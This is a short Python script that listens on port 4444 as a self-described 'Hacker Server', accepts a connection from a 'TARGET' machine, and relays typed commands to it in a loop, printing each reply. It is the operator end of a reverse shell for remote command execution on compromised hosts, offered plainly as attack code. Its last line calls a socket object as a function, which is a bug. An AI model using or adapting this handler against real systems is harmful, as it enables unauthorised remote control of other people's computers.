import sys
import socket

SERVER_IP = '0.0.0.0'
SERVER_PORT = 4444
addr_s = (SERVER_IP, SERVER_PORT)
cmd =''

s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s1.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s1.bind(addr_s)
s1.listen(1)

print('[**] This Hacker Server is listening for cmd')
s_client, address = s1.accept()
print(f'=====================================')
print(f'[**] Accepted a connection from a TARGET: {s_client.getpeername()}')
msg = s_client.recv(2048).decode()
print(msg)

while cmd != 'quit':
    cmd = input("Enter a command: ")
    s_client.send(cmd.encode())
    msg = s_client.recv(2048).decode()
    print(msg)

s1.close()
s_client()